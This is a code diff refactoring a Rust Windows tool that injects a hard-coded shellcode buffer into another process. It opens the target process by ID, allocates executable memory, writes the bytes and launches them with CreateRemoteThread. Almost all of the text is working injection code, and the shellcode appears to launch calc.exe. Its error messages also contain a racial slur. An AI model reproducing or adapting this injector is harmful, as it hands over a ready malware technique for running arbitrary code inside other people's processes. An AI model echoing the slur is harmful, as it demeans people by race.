@@ -1,25 +1,25 @@
-use winapi::um::winnt::*;
-use winapi::um::memoryapi::*;
-use winapi::um::processthreadsapi::*;
-use winapi::um::handleapi::*;
-use winapi::um::winuser::*;
-use winapi::shared::minwindef::DWORD;
-use winapi::um::errhandlingapi::*;
-use std::ptr;
-use std::io;
+use {
+    winapi::{
+        shared::minwindef::DWORD,
+        um::{
+            winnt::*,
+            memoryapi::*,
+            processthreadsapi::*,
+            handleapi::*,
+            winuser::*,
+            errhandlingapi::*
+        }
+    },
+    std::{
+        io,
+        ptr
+    }
+};
 
 
 fn main(){
-    let mut pid: String = String::new();
-    println!("[+] Process ID : ");
-    io::stdin()
-        .read_line(&mut pid)
-        .expect("enter a number nigger!");
-    
-    let procid: DWORD = pid.trim().parse()
-        .expect("enter an integer nigger!");
-    
-    let Buffer: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+
+    const BUFFER: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
     0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
     0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
     0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
@@ -44,36 +44,42 @@ fn main(){
     0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
     0x63,0x2e,0x65,0x78,0x65,0x00];
 
+    let mut pid: String = String::new();
+    println!("[+] Process ID : ");
+    io::stdin()
+        .read_line(&mut pid)
+        .expect("enter a number nigger!");
+    
+    let procid: DWORD = pid.trim().parse()
+        .expect("enter an integer nigger!");
+
     let hProcess: HANDLE = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, procid) };
     if hProcess == INVALID_HANDLE_VALUE {
         unsafe {
-            let mut gle: DWORD =  unsafe { GetLastError() as _ };
-            println!("error code : {}", gle);
+            println!("OpenProcess error : {}", GetLastError());
+            CloseHandle(hProcess)
         };
     }
-    else {
-        let alloc = unsafe { VirtualAllocEx(hProcess, ptr::null_mut(), std::mem::size_of_val(&Buffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
-        if alloc == ptr::null_mut() {
-            let mut gle: DWORD =  unsafe { GetLastError() as _ };
-            println!("error code : {}", gle);
-        }
-        else {
-            let wpm: i32 = unsafe { WriteProcessMemory(hProcess, alloc, Buffer.as_ptr() as *const _, std::mem::size_of_val(&Buffer), ptr::null_mut()) };
-            if wpm == 0 {
-                let mut gle: DWORD =  unsafe { GetLastError() as _ };
-                println!("error code : {}", gle);
-            }
-            else {
-                let crt: HANDLE = unsafe { CreateRemoteThread(hProcess, ptr::null_mut(), 0, Some(std::mem::transmute(alloc)), ptr::null_mut(), 0, ptr::null_mut()) };
-                if crt == INVALID_HANDLE_VALUE {
-                    let mut gle: DWORD =  unsafe{GetLastError() as _};
-                    println!("error code : {}", gle);
-                }
-            }
-        }
-
+    
+    let alloc = unsafe { VirtualAllocEx(hProcess, ptr::null_mut(), std::mem::size_of_val(&BUFFER), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };
+    if alloc == ptr::null_mut() {
+        unsafe { println!("VirtualAllocEx error : {}", GetLastError()) };
     }
-
-
-
+    
+    let wpm: i32 = unsafe { WriteProcessMemory(hProcess, alloc, BUFFER.as_ptr() as *const _, std::mem::size_of_val(&BUFFER), ptr::null_mut()) };
+    if wpm == 0 {
+        unsafe { println!("WriteProcessMemory error : {}", GetLastError()) };
+    }
+    
+    let crt: HANDLE = unsafe { CreateRemoteThread(hProcess, ptr::null_mut(), 0, Some(std::mem::transmute(alloc)), ptr::null_mut(), 0, ptr::null_mut()) };
+    if crt == INVALID_HANDLE_VALUE {
+        unsafe { 
+            println!("CreateRemoteThread error : {}", GetLastError());
+            CloseHandle(crt)
+        };
+    }
+    unsafe {
+        CloseHandle(hProcess);
+        CloseHandle(crt) 
+    };
 }
